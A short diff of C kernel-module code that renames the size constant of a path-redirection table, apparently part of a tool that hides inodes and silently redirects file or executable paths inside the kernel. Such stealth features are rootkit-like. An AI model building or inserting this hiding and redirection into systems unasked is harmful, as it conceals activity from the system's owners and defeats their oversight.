@@ -38,11 +38,11 @@ void unhide_inode(u64 ino)
 	}
 }
 
-static struct redirect_path redirect_pathes[MAX_REDIRECT_EXECVE] = { {0, NULL, 0, NULL, 0} };
+static struct redirect_path redirect_pathes[MAX_PATH_REDIRECT] = { {0, NULL, 0, NULL, 0} };
 
 char *get_redirect_path(char *old_path, int mode)
 {
-	for (int i = 0; i < MAX_REDIRECT_EXECVE; i++) {
+	for (int i = 0; i < MAX_PATH_REDIRECT; i++) {
 		struct redirect_path *r = redirect_pathes + i;
 		if (!r->old_path)
 			continue;
@@ -73,7 +73,7 @@ void redirect_path(char *old_path, unsigned int old_path_len,
 
 	pr_debug("%s: redirect %s to %s\n", __func__, kold_path, knew_path);
 
-	for (int i = 0; i < MAX_REDIRECT_EXECVE; i++) {
+	for (int i = 0; i < MAX_PATH_REDIRECT; i++) {
 		struct redirect_path *r = redirect_pathes + i;
 		if (!r->old_path) {
 			r->mode = mode;
@@ -103,7 +103,7 @@ void unredirect_path(const char *old_path, unsigned int len, int mode)
 
 	pr_debug("%s: unredirect %s\n", __func__, kold_path);
 
-	for (int i = 0; i < MAX_REDIRECT_EXECVE; i++) {
+	for (int i = 0; i < MAX_PATH_REDIRECT; i++) {
 		struct redirect_path *r = redirect_pathes + i;
 		if (!r->old_path)
 			continue;
